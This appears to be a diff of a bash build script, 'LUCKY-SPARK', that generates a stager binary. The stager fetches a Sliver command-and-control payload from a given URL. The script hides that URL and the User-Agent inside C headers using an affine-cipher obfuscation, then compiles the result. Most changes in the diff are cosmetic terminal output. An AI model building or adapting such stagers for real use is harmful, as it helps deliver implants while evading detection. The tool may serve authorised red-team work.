@@ -1,8 +1,8 @@
 #!/bin/bash
 clear
-    echo '      *         .     .  
-   .     *  LUCKY_SPARK   . *   *   .    *    
-      *       .       *       .'
+echo
+echo -e "\033[38;5;208m⟪ LUCKY-SPARK ⟫\033[0m"
+echo
 
 
 DEFAULT_UA="Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.0.0 Safari/537.36"
@@ -11,19 +11,20 @@ URL=""
 USERAGENT=""
 CONFIG_ONLY=false
 
-# Parse arguments
+
 while [[ "$#" -gt 0 ]]; do
     case "$1" in
-        -u|-url)
+        -u|--url)
             if [[ -n "$2" ]]; then
                 URL="$2"
                 shift 2
             else
                 echo "Error: -url requires a value"
+				echo -e "\033[38;5;208m⟩ Error: -url requires a value\033[0m"
                 exit 1
             fi
             ;;
-        -a|-agent)
+        -a|--agent)
             if [[ -n "$2" ]]; then
                 USERAGENT="$2"
                 shift 2
@@ -33,35 +34,49 @@ while [[ "$#" -gt 0 ]]; do
             fi
             ;;
         -h|--help)
-            echo "Usage: $0 -url <URL> [-agent <User-Agent>] [-c|--config]"
+    echo -e "\033[1;34mUsage:\033[0m $0 -u|--url <URL> [-a|--agent <User-Agent>] [-c|--config] [-h|--help]
+
+Options:
+  -u, --url       Specify the full URL where the Sliver payload is hosted. This is required unless entered interactively.
+  -a, --agent     Specify a custom User-Agent string to use for HTTP requests. Optional; Get prompted if obmitted.
+  -c, --config    Generate only the config files without running the build process.
+  -h, --help      Show this help message and exit.
+"
             exit 0
             ;;
         -c|--config)
-            echo "Generating only Config File"
+            echo "⟩ Generating only Config File"
             CONFIG_ONLY=true
             shift 1
             ;;
         *)
-            echo "Unknown parameter: $1"
+            echo "⟩ Unknown parameter: $1"
             exit 1
             ;;
     esac
 done
 
 if [[ -z "$URL" ]]; then
-    read -p "Enter URL: " URL
+	echo -e "\033[1;34m⟩ Enter URL:\033[0m "
+    read -p "⟩ " URL
+
+
 fi
 
 if [[ -z "$USERAGENT" ]]; then
-    read -p "Enter User-Agent (leave empty for default): " USERAGENT
+
+	echo -e "\033[1;34m⟩ Enter User-Agent (leave empty for default):\033[0m "
+    read -p "⟩ " USERAGENT
 fi
 
 if [[ -z "$USERAGENT" ]]; then
     USERAGENT="$DEFAULT_UA"
+	echo -ne "\033[1A\033[2K"
+	echo "⟩ $DEFAULT_UA"
 fi
 
 if [[ -z "$URL" ]]; then
-    echo "Error: URL must not be empty."
+    echo -e "\033[38;5;208m⟩ Error: URL must not be empty.\033[0m"
     exit 1
 fi
 
@@ -70,9 +85,9 @@ if [ "$CONFIG_ONLY" = false ]; then
 fi
 
 
-# Function to generate a random odd number between 1 and 255
+
 generate_odd() {
-  local num=$((RANDOM % 256))  # Random number 0-255
+  local num=$((RANDOM % 256))  
   if (( num % 2 == 0 )); then
     num=$((num + 1))
   fi
@@ -82,7 +97,7 @@ generate_odd() {
   echo $num
 }
 
-# Extended Euclidean Algorithm to find modular inverse
+
 modinv() {
   local a=$1
   local m=$2
@@ -115,28 +130,23 @@ modinv() {
 }
 
 
-
-
-
-# Function to encrypt a string including the null terminator
-# Output as comma-separated 0xHH bytes
 encrypt_string_c_hex() {
     local input="$1"
     local i char ascii obf
     local output=""
 
-    # Loop through each character + null terminator
+    
     for (( i=0; i<=${#input}; i++ )); do
         if (( i < ${#input} )); then
             char="${input:$i:1}"
             ascii=$(printf "%d" "'$char")
         else
-            # Null terminator
+            
             ascii=0
         fi
-        # Apply OBF_BYTE: (A * ascii + B) % 256
+        
         obf=$(( (A * ascii + B) & 0xFF ))
-        # Append as 0xHH, comma-separated
+        
         if [[ -n "$output" ]]; then
             output+=", "
         fi
@@ -160,6 +170,9 @@ echo "#define A  $A" >> ./inc/lucky_obf_configs.h
 echo "#define B $B">> ./inc/lucky_obf_configs.h
 echo "#define INV_A $INV_A">> ./inc/lucky_obf_configs.h
 
+echo -e "\033[1;34m⟩ Affine Cipher Parameters for String Obfuscation:\033[0m "
+echo "⟩ A=$A INV_A=$INV_A B=$B"
+
 
 echo "#pragma once" > ./inc/lucky_net_configs.h
 echo "" >> ./inc/lucky_net_configs.h
@@ -168,29 +181,24 @@ echo "const unsigned char s_UserAgent[] = { $OBFUSCATED_AGENT };" >> ./inc/lucky
 
 
 frames=(
-'   *     .       *     .       *    
-       .    Generating Stager ...   *   .
-  *       .       *       .       *'
-'       *       .         *    
-    *       Generating Stager ...     *
-       .        *       .'
-'   .     *       .       *      
-       *    Generating Stager ...   .    
-  .       *       .       *'
-'      *         .     .  
-   .     *  Generating Stager ...     .    *    
-      *       .       *       .'
+$'\033[1;34m⟩ Generating Binary  ⣾\033[0m'
+$'\033[1;34m⟩ Generating Binary  ⣽\033[0m'
+$'\033[1;34m⟩ Generating Binary  ⣻\033[0m'
+$'\033[1;34m⟩ Generating Binary  ⢿\033[0m'
+$'\033[1;34m⟩ Generating Binary  ⡿\033[0m'
+$'\033[1;34m⟩ Generating Binary  ⣟\033[0m'
+$'\033[1;34m⟩ Generating Binary  ⣯\033[0m'
+$'\033[1;34m⟩ Generating Binary  ⣷\033[0m'
 )
 
-# Function to show multi-line throbber while a command runs
 show_spinner() {
     local pid=$1
     local delay=0.3
     local i=0
 
     while kill -0 "$pid" 2>/dev/null; do
-        clear
-        echo "${frames[i]}"
+        printf "\r\033[2K%s" "${frames[i]}"
+
         ((i=(i+1)%${#frames[@]}))
         sleep $delay
     done
@@ -201,26 +209,31 @@ if [ "$CONFIG_ONLY" = false ]; then
 
     make all >> .makelogs.txt 2>&1 &
     MAKE_PID=$!
+	echo
+    
     show_spinner $MAKE_PID
     wait $MAKE_PID
-    MAKE_EXIT_CODE=$?   
+    MAKE_EXIT_CODE=$?
 
-    clear
+	
+    
+    printf "\r\033[2K"
 
     if [ $MAKE_EXIT_CODE -eq 0 ]; then
-		rm -rf ./obj
-        echo '      *         .     .  
-   .     *  Stager Generation done!   .    *    
-      *       .       *       .'
+        rm -rf ./obj
+        
+        echo -e "\033[1;34m⟩ Generating Binary  ⣿\033[0m"
     else
-        echo '      !         .     .  
-   .     !  Make failed! Check .makelogs.txt   .    !    
-      !       .       !       .'
+        
+        echo -e "\033[38;5;208m⟩ Generating Binary Error: see makelogs.txt\033[0m"
         exit $MAKE_EXIT_CODE  
     fi
 
+else
+    echo
 fi
 
 
+echo -e "\033[1;34m⟩ Done!\033[0m\n"
 
 
